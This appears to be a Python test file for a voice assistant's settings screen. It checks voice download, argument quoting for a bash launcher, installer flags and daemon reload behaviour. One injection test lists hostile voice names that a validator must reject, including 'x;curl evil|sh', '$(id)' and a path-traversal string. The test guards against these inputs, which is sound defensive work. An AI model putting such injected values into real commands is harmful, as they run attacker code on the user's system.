"""Choosing a voice has to be able to get it.

The list offers every voice the project knows and marks the ones not on disk,
and the daemon substitutes a voice that is when the chosen one is missing --
so nothing breaks. But nothing downloads it either: only install.sh fetches
voices. Selecting one was a dead end that announced itself only in a log.
"""
from __future__ import annotations

import re
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
from qml_sources import overlay, overlay_files, page

SETTINGS = overlay()
# The main agent's voice is on its card on the Agents page, beside every
# other agent's, since the per-agent voice and speed settings.
VOICE = page("Agents")
DAEMON = (ROOT / "daemon" / "wake_listen.py").read_text()


# Found by content rather than by neighbours: the label was "Voice" and is now
# "Spoken voice", and the three controls in that box have since been reversed.
# Both tests below used to slice between two labels and broke on each change,
# which is noise -- and worse, the reordering deleted the offer outright and
# only these caught it.

def _voice_dropdown() -> str:
    start = VOICE.index('page.s.put("voice", v)')
    return VOICE[VOICE.rindex("Dropdown {", 0, start):VOICE.index("}", start)]


def _download_offer() -> str:
    start = VOICE.index("visible: page.s.voiceMissing(page.mainVoice)")
    return VOICE[VOICE.rindex("Column {", 0, start):
                 VOICE.index("\n    }", start)]


def _function(name: str) -> str:
    body = SETTINGS[SETTINGS.index(f"function {name}("):]
    return body[:body.index("\n  }")]


def test_a_voice_that_is_not_on_disk_can_be_downloaded():
    """Choosing it is the request; the button is the way back if that failed."""
    assert "page.s.chooseVoice(v)" in _voice_dropdown(), "choosing must fetch it"
    assert "root.fetchVoice" in _function("chooseVoice")
    offer = _download_offer()
    assert "page.s.fetchVoice" in offer, "and there must be a way to retry"
    # An extra agent's voice goes through the same path.
    assert "page.s.chooseVoice(v)" in page("Agents")


def test_the_voice_name_is_named_on_the_command_line():
    """Not read back out of the setting: choosing a voice starts the download
    at once, and `omarchy bar set` has not necessarily landed yet. It is an
    argv for `agentvoice voice fetch`, with no shell in between."""
    fetch = SETTINGS[SETTINGS.index("function nextFetch"):]
    fetch = fetch[:fetch.index("\n  }")]
    assert '["agentvoice", "voice", "fetch", v]' in fetch


def test_only_a_real_voice_name_reaches_the_shell():
    """The launcher runs its argument through `bash -c`, and the voice comes
    out of shell.json, which this screen is not the only writer of. A value of
    `x;curl evil|sh` must not be a command."""
    fetch = SETTINGS[SETTINGS.index("function fetchVoice"):]
    fetch = fetch[:fetch.index("\n  }")]
    pattern = re.search(r"/\^(.+)\$/\.test", fetch)
    assert pattern, "fetchVoice must check the shape of the name first"
    rule = re.compile("^" + pattern.group(1).replace("\\\\", "\\") + "$")
    for good in ("lessac-medium", "hfc_male-medium", "amy-low", "ryan-x_low"):
        assert rule.match(good), good
    for bad in ("x;curl evil|sh", "a b", "../../etc/passwd", "lessac-medium ",
                "$(id)", "lessac-huge", ""):
        assert not rule.match(bad), bad


def test_every_launcher_argument_is_quoted():
    """`omarchy-launch-floating-terminal-with-presentation` takes a command
    line, not an argv: it does `cmd="$*"` and runs `bash -c "$cmd"`. So a
    $HOME with a space in it was enough to split the command in two, and a
    value out of shell.json was enough to add one.
    """
    body = SETTINGS[SETTINGS.index("function fetchNow"):]
    body = body[:body.index("\n  }")]
    assert "shq(argv[i])" in body, "each argument has to be quoted"
    assert 'Quickshell.env("HOME") +' not in body, "and so does the path"

    for qml in overlay_files() + ["Panel.qml"]:
        text = (ROOT / qml).read_text()
        for call in re.finditer(
                r'"omarchy-launch-floating-terminal-with-presentation",'
                r'(.{0,400}?)\]', text, re.S):
            arg = call.group(1)
            if re.fullmatch(r'\s*"[A-Za-z][A-Za-z0-9_.-]*"\s*', arg):
                continue        # a bare command name, nothing interpolated
            if re.fullmatch(r"\s*[A-Za-z_][A-Za-z0-9_]*\s*", arg):
                # A variable: it has to have been built with shq just above.
                before = text[max(0, call.start() - 600):call.start()]
                assert "shq(" in before, f"{qml}: {arg.strip()} built unquoted"
            else:
                assert "shq(" in arg, f"{qml}: unquoted launcher argument {arg!r}"


def test_the_offer_appears_only_when_it_is_missing():
    assert "voiceMissing(page.mainVoice)" in _download_offer()
    missing = _function("voiceMissing")
    assert "< 0" in missing, "shown when the voice is absent from the list"
    assert "voicesOnDisk.length > 0" in missing, \
        "an empty probe result must not claim every voice is missing"


def test_the_installer_is_called_with_a_flag_it_accepts():
    """It used to scan from `/install.sh` to the closing quote, which in this
    file is the very next character -- so it captured nothing, checked
    nothing, and renaming a flag would not have failed it. The flags are in
    the QML as whole string literals, so that is what to look for.
    """
    accepted = set()
    # `--name)` for a switch, `--name=*)` for one that takes a value.
    for m in re.finditer(r"^\s*--([a-z-]+)(?:=\*)?(?:\|--?([a-z-]+))*\)",
                         (ROOT / "install.sh").read_text(), re.M):
        accepted.update(g for g in m.groups() if g)
    assert "oww" in accepted and "voice" in accepted, "parsed install.sh wrong"

    # Only the places that actually run install.sh. `--json` elsewhere in the
    # file belongs to `omarchy bar set`, which is a different program.
    # fetchVoice no longer runs it: a voice downloads through
    # `agentvoice voice fetch` (test_voice_library.py).
    regions = [SETTINGS[m.start():SETTINGS.index("}", m.start())]
               for m in re.finditer(r"function fetchNow", SETTINGS)]
    regions += [m.group(1) for m in re.finditer(r"fetchNow\(\[([^\]]*)\]", SETTINGS)]
    for qml in overlay_files() + ["Panel.qml"]:
        text = (ROOT / qml).read_text()
        regions += [text[m.start():m.start() + 400] for m in re.finditer(
            r'"omarchy-launch-floating-terminal-with-presentation"', text)]

    found = set()
    for region in regions:
        for flag in re.findall(r'--([a-z][a-z-]*)', region):
            found.add(flag)
            assert flag in accepted, f"install.sh does not accept --{flag}"
    assert {"oww", "no-keybinds", "uninstall"} <= found, found


def test_the_installer_fetches_both_the_named_and_the_configured_voice():
    """Named on the command line, because choosing a voice fires the installer
    at once and `omarchy bar set` has not necessarily landed -- reading the
    setting alone would race the write. The configured one is still fetched
    too: a --voice run is also an install, and the voice in use has to be
    present when it finishes.
    """
    install = (ROOT / "install.sh").read_text()
    loop = install[install.index('for v in "$WANT_VOICE_ARG"'):]
    loop = loop[:loop.index("done") + 4]
    assert "$(configured voice)" in loop
    assert 'fetch_voice "$v"' in loop
    assert "--voice=*)" in install, "the flag has to be accepted"


def test_a_downloaded_voice_is_picked_up_without_touching_a_setting():
    """A file appearing changes no setting, so a check behind the
    config-changed gate would leave the substitution in place until something
    unrelated moved -- the same stall as the detection threshold that never
    reached the running engine."""
    refresh = DAEMON[DAEMON.index("    def refresh(self):"):]
    refresh = refresh[:refresh.index("    def reconcile_voice")]
    before_gate = refresh[:refresh.index("if not changed:")]
    assert "self.reconcile_voice()" in before_gate, \
        "the voice check must not sit behind the config-changed guard"


def test_reconciling_the_voice_is_cheap_when_nothing_changed():
    """It runs on every poll now, so it must not rebuild Piper each time."""
    body = DAEMON[DAEMON.index("    def reconcile_voice"):]
    body = body[:body.index("\n    def ", 10)]
    guard = body[body.index("if (self.speaker is not None"):]
    guard = guard[:guard.index("return") + 6]
    for condition in ("requested == wanted", "not self.speaker.superseded()"):
        assert condition in guard, f"missing {condition}"
